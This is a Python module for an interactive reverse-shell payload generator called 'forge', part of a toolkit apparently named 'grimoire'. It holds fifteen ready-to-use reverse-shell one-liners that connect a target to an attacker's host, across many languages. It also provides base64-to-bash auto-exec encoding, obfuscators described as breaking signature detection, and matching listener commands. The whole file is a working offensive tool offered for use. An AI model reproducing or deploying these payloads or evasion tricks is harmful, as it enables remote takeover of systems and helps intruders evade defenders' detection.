# forge — payload generator

import base64, os
from datetime import datetime
from pathlib import Path
from ..utils import C, section

BANNER = f"""
{C.RED}{C.BOLD}  ╔══════════════════════════════════════════════╗
  ║  F O R G E  v2.0  —  Payload Generator      ║
  ║  Developer: Light (Neok1ra)                  ║
  ╚══════════════════════════════════════════════╝{C.RESET}
  {C.DIM}15 shells · 5 encoders · 3 obfuscators · save-to-file{C.RESET}
"""

# ── Shell templates ───────────────────────────────────────────

SHELLS = {
    "bash_tcp": {
        "lang": "bash", "os": "linux",
        "cmd": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    },
    "bash_udp": {
        "lang": "bash", "os": "linux",
        "cmd": "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
    },
    "python3_tcp": {
        "lang": "python3", "os": "linux/win",
        "cmd": ("python3 -c 'import socket,subprocess,os;"
                "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                "subprocess.call([\"/bin/sh\",\"-i\"])'"),
    },
    "python3_pty": {
        "lang": "python3", "os": "linux",
        "cmd": ("python3 -c 'import socket,subprocess,os,pty;"
                "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
                "pty.spawn(\"/bin/bash\")'"),
    },
    "python3_win": {
        "lang": "python3", "os": "windows",
        "cmd": ("python3 -c 'import socket,subprocess;"
                "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                "subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)'"),
    },
    "nc_mkfifo": {
        "lang": "nc", "os": "linux",
        "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    },
    "nc_e": {
        "lang": "nc", "os": "linux",
        "cmd": "nc -e /bin/sh {lhost} {lport}",
    },
    "socat_tcp": {
        "lang": "socat", "os": "linux",
        "cmd": "socat TCP:{lhost}:{lport} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
    },
    "socat_tty": {
        "lang": "socat", "os": "linux",
        "cmd": "socat TCP:{lhost}:{lport} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
    },
    "php_proc": {
        "lang": "php", "os": "linux/win",
        "cmd": "php -r '$sock=fsockopen(\"{lhost}\",{lport});proc_open(\"/bin/sh -i\",array($sock,$sock,$sock),$p);'",
    },
    "perl_tcp": {
        "lang": "perl", "os": "linux",
        "cmd": ("perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                "connect(S,sockaddr_in($p,inet_aton($i)));"
                "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                "exec(\"/bin/sh -i\");'"),
    },
    "ruby_tcp": {
        "lang": "ruby", "os": "linux",
        "cmd": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    },
    "awk": {
        "lang": "awk", "os": "linux",
        "cmd": "awk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";while(1){{do{{printf\">\"|&s;s|&getline c;if(c){{while((c|&getline)>0)print|&s;close(c)}}}}while(c!=\"exit\")}}close(s)}}'",
    },
    "powershell": {
        "lang": "powershell", "os": "windows",
        "cmd": ("powershell -NoP -NonI -W Hidden -Exec Bypass "
                "-C \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
                "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                "$r=(iex $d 2>&1|Out-String);"
                "$s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)}}\""),
    },
    "java": {
        "lang": "java", "os": "linux/win",
        "cmd": ("java -jar nothing.jar; "
                "Runtime r=Runtime.getRuntime();"
                "Process p=r.exec(new String[]{{\"bash\",\"-c\","
                "\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read l;do $l 2>&5 >&5;done\"}});"
                "p.waitFor();"),
    },
}

# ── Encoders ──────────────────────────────────────────────────

def _enc_base64(s):
    return base64.b64encode(s.encode()).decode()

def _enc_base64_exec(s):
    b64 = base64.b64encode(s.encode()).decode()
    return f"echo {b64} | base64 -d | bash"

def _enc_hex(s):
    return s.encode().hex()

def _enc_url(s):
    return urllib_quote(s)

def _enc_unicode(s):
    return "".join(f"\\u{ord(c):04x}" for c in s)

def urllib_quote(s):
    safe = ''
    encoded = ''
    for c in s:
        if c.isalnum() or c in '-_.~':
            encoded += c
        else:
            encoded += f'%{ord(c):02X}'
    return encoded

ENCODERS = {
    "base64":       (_enc_base64,      "Raw base64"),
    "base64_exec":  (_enc_base64_exec, "base64 | base64 -d | bash (auto-exec)"),
    "hex":          (_enc_hex,         "Hex encoding"),
    "url":          (_enc_url,         "URL encoding"),
    "unicode":      (_enc_unicode,     "Unicode escape sequences"),
}

# ── Obfuscation ───────────────────────────────────────────────

def obfuscate_bash(cmd: str) -> str:
    """Insert bash variable tricks to break signature detection."""
    tricks = [
        lambda c: c.replace("bash", 'b""as""h').replace("/bin/sh", '/b""in/s""h'),
        lambda c: f"$(echo {base64.b64encode(c.encode()).decode()} | base64 -d)",
        lambda c: c.replace("nc ", "$'\\x6e\\x63' ").replace("bash", "$'\\x62\\x61\\x73\\x68'"),
    ]
    import random
    return random.choice(tricks)(cmd)

def obfuscate_powershell(cmd: str) -> str:
    """PowerShell obfuscation via char concat."""
    chars = "+".join(f"[char]{ord(c)}" for c in cmd)
    return f"IEX({chars})"

OBFUSCATORS = {
    "bash_var":   ("Bash variable injection",     obfuscate_bash),
    "ps_char":    ("PowerShell char concat",       obfuscate_powershell),
    "b64_exec":   ("Base64 pipe exec",
                   lambda c: f"eval $(echo {base64.b64encode(c.encode()).decode()} | base64 -d)"),
}

# ── Listener generator ────────────────────────────────────────

def listener_cmd(lport: str, shell_type: str = "bash") -> str:
    cmds = {
        "bash":       f"nc -lvnp {lport}",
        "socat":      f"socat -d -d TCP-LISTEN:{lport},reuseaddr,fork STDOUT",
        "socat_tty":  f"socat TCP-LISTEN:{lport},reuseaddr FILE:`tty`,raw,echo=0",
        "rlwrap":     f"rlwrap nc -lvnp {lport}",
        "python3":    (f"python3 -c \""
                       f"import socket,os,pty;"
                       f"s=socket.socket();"
                       f"s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                       f"s.bind(('',{lport}));s.listen(1);"
                       f"c,a=s.accept();"
                       f"[os.dup2(c.fileno(),fd) for fd in (0,1,2)];"
                       f"pty.spawn('/bin/bash')\""),
    }
    return cmds.get(shell_type, cmds["bash"])


# ── Save to file ──────────────────────────────────────────────

def save_payload(payload: str, name: str = "payload") -> str:
    out_dir = Path.home() / ".grimoire" / "payloads"
    out_dir.mkdir(parents=True, exist_ok=True)
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = out_dir / f"{name}_{ts}.txt"
    out.write_text(payload)
    return str(out)


# ── Display helpers ───────────────────────────────────────────

def _list_shells():
    print(f"\n  {C.RED}{'NAME':<18} {'LANG':<12} {'OS'}{C.RESET}")
    print(f"  {'─'*48}")
    for name, s in SHELLS.items():
        print(f"  {C.CYAN}{name:<18}{C.RESET} {s['lang']:<12} {C.DIM}{s['os']}{C.RESET}")
    print()

def _list_encoders():
    print(f"\n  {C.RED}{'NAME':<16} {'DESCRIPTION'}{C.RESET}")
    print(f"  {'─'*48}")
    for name, (_, desc) in ENCODERS.items():
        print(f"  {C.CYAN}{name:<16}{C.RESET} {desc}")
    print()

def _list_obfuscators():
    print(f"\n  {C.RED}{'NAME':<16} {'DESCRIPTION'}{C.RESET}")
    print(f"  {'─'*48}")
    for name, (desc, _) in OBFUSCATORS.items():
        print(f"  {C.CYAN}{name:<16}{C.RESET} {desc}")
    print()


# ── Interactive ───────────────────────────────────────────────

def _interactive():
    print(BANNER)
    print(f"  {C.DIM}Commands: list | gen | encode | obfuscate | listener | exit{C.RESET}\n")
    while True:
        try:
            raw = input(f"  {C.RED}forge>{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  [Closing Forge]")
            break
        if not raw: continue
        parts = raw.split(None, 1)
        cmd   = parts[0].lower()

        if cmd in ("exit","quit","q"):
            break

        elif cmd == "list":
            _list_shells()

        elif cmd == "gen":
            _list_shells()
            name = input(f"  {C.DIM}Shell name:{C.RESET} ").strip()
            if name not in SHELLS:
                print(f"  {C.YELLOW}[!] Unknown shell{C.RESET}"); continue
            lhost = input(f"  {C.DIM}LHOST:{C.RESET} ").strip()
            lport = input(f"  {C.DIM}LPORT:{C.RESET} ").strip()
            payload = SHELLS[name]["cmd"].format(lhost=lhost, lport=lport)

            print(f"\n  {C.GREEN}[PAYLOAD — {name}]{C.RESET}")
            print(f"  {payload}\n")

            # encode?
            _list_encoders()
            enc = input(f"  {C.DIM}Encode? (name or blank):{C.RESET} ").strip().lower()
            if enc in ENCODERS:
                payload = ENCODERS[enc][0](payload)
                print(f"\n  {C.GREEN}[ENCODED — {enc.upper()}]{C.RESET}")
                print(f"  {payload}\n")

            # obfuscate?
            _list_obfuscators()
            ob = input(f"  {C.DIM}Obfuscate? (name or blank):{C.RESET} ").strip().lower()
            if ob in OBFUSCATORS:
                payload = OBFUSCATORS[ob][1](payload)
                print(f"\n  {C.GREEN}[OBFUSCATED — {ob.upper()}]{C.RESET}")
                print(f"  {payload}\n")

            # save?
            sv = input(f"  {C.DIM}Save to file? (y/n):{C.RESET} ").strip().lower()
            if sv == "y":
                saved = save_payload(payload, name)
                print(f"  {C.GREEN}[+] Saved: {saved}{C.RESET}")

            # listener
            print(f"\n  {C.RED}[LISTENER COMMAND]{C.RESET}")
            ltype = "rlwrap" if "bash" in name else ("socat_tty" if "socat" in name else "bash")
            print(f"  {listener_cmd(lport, ltype)}")

            from ..core.oplog import log
            log(f"Payload: {name} => {lhost}:{lport}", "forge")

        elif cmd == "encode":
            text = input(f"  {C.DIM}Text to encode:{C.RESET} ").strip()
            _list_encoders()
            method = input(f"  {C.DIM}Method:{C.RESET} ").strip().lower()
            if method in ENCODERS:
                print(f"  {C.GREEN}[{method.upper()}]{C.RESET} {ENCODERS[method][0](text)}")

        elif cmd == "obfuscate":
            text = input(f"  {C.DIM}Payload to obfuscate:{C.RESET} ").strip()
            _list_obfuscators()
            method = input(f"  {C.DIM}Method:{C.RESET} ").strip().lower()
            if method in OBFUSCATORS:
                print(f"  {C.GREEN}[{method.upper()}]{C.RESET} {OBFUSCATORS[method][1](text)}")

        elif cmd == "listener":
            lport = input(f"  {C.DIM}LPORT:{C.RESET} ").strip()
            print(f"  Available: {', '.join(['bash','socat','socat_tty','rlwrap','python3'])}")
            ltype = input(f"  {C.DIM}Type [rlwrap]:{C.RESET} ").strip() or "rlwrap"
            print(f"\n  {C.GREEN}[LISTENER]{C.RESET}")
            print(f"  {listener_cmd(lport, ltype)}\n")

        else:
            print(f"  {C.DIM}Commands: list | gen | encode | obfuscate | listener | exit{C.RESET}")


def cli_main(args):
    if args and ("--help" in args or "-h" in args):
        print(f"""
  {C.RED}{C.BOLD}FORGE — Payload Generator{C.RESET}
  {C.DIM}Usage:{C.RESET}
    grimoire forge      interactive payload generator

  {C.DIM}Features:{C.RESET}
    15 reverse shell templates (bash, python, php, powershell, java...)
    5 encoders: base64, hex, url, unicode, base64_exec
    3 obfuscators: bash_var, ps_char, b64_exec
    Listener command generator
    Save payloads to ~/.grimoire/payloads/
""")
        return
    _interactive()

def launch(): _interactive()
